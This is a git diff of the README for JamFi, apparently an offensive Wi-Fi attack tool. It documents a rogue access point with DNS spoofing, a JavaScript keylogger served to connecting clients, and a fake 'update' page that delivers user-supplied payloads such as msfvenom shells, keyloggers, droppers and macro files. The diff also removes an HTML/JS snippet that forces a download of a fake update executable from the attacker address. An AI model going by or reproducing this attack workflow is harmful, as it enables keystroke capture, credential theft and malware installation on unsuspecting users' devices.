@@ -136,19 +136,52 @@ Descriptions
 
 ## The `loot/` Folder
 
-JamFi auto-generates files inside `loot/` for phishing and payload delivery:
+JamFi logs data, HTML, and attack files to `loot/`:
 
-| File                | Purpose                                                |
-|---------------------|--------------------------------------------------------|
-| `index.html`        | Default captive portal homepage                        |
-| `login.html`        | Fake login form with credential capture                |
-| `creds.txt`         | Logged usernames and passwords                         |
-| `phish_server.py`   | Simple Python server to collect form submissions       |
-| `injection.html`    | Fake update/payload download page for MITM injection   |
-| `hostapd.conf`      | Config file for starting the evil AP                   |
-| `dnsmasq.conf`      | Handles DHCP and DNS for rogue AP                      |
-| `dnsspoof_hosts`    | Redirects all DNS queries to local attacker IP         |
-| `hotspot-detect.html` | Triggers captive portal on iOS/macOS                 |
+| File                  | Purpose                                                 |
+|-----------------------|---------------------------------------------------------|
+| `injection.html`      | JS keylogger + redirect to fake update                  |
+| `fake_update.html`    | Auto-download payload on user click                     |
+| `keystroke_log_*.txt` | Logs captured JS keystrokes during MITM                 |
+| `session_log_*.txt`   | Visitor IPs, paths, user agents                         |
+| `hostapd.conf`        | Evil AP config                                          |
+| `dnsmasq.conf`        | DHCP/DNS for fake AP                                    |
+| `dnsspoof_hosts`      | Forces DNS to attacker (10.0.0.1)                       |
+| `wps_*.txt`           | WPS module logs  (coming soon)                                       |
+
+---
+
+## The `payloads/` Folder
+
+Add real payloads here! These get served by the MITM module:
+
+| File Example           | Description                             |
+|------------------------|-----------------------------------------|
+| `payload.exe`          | Real .exe payload (e.g. msfvenom shell) |
+| `reverse_shell.zip`    | Archive with malicious scripts          |
+| `payload.bat`          | Batch script for Windows                |
+| `keylogger_beacon.py`  | Python beacon/keylogger script          |
+| `autostart.html`       | HTML payload w/ JS autostart tricks     |
+| `macro.vba`            | Word macro payload (manual delivery)    |
+| `loot_dropper.py`      | Python dropper or payload loader        |
+
+---
+
+## MITM HID Injection Overview
+
+When you choose option `11`:
+
+- Broadcasts a fake SSID using beacon spoofing  
+- Clients connect, see `injection.html`  
+- JS keylogger logs keystrokes  
+- Page auto-redirects to `fake_update.html`  
+- Payloads download when user clicks **Update**  
+- Logs are saved to `loot/session_log_*.txt` and `loot/keystroke_log_*.txt`
+
+All files are served from `http://10.0.0.1`.
+
+
+Add your own payloads to the `payloads/` directory and they will auto load for use with Jam_fi MITM.
 
 ---
 
@@ -168,29 +201,6 @@ Edit `loot/login.html` to create a custom phishing page:
 
 Captured credentials are logged to `loot/creds.txt`.
 
----
-
-## MITM Fake Update Injection
-
-You can simulate a fake update prompt with `loot/injection.html`:
-
-```html
-<h2>Browser Update Required</h2>
-<p>To continue browsing, please install the latest security patch.</p>
-<button onclick="downloadUpdate()">Update Now</button>
-
-<script>
-function downloadUpdate() {
-  const a = document.createElement('a');
-  a.href = 'http://10.0.0.1/fake_update.exe';
-  a.download = 'update.exe';
-  document.body.appendChild(a);
-  a.click();
-}
-</script>
-```
-
-Add your own payloads to the `loot/` directory and they will auto-download when the button is clicked.
 
 ---
 
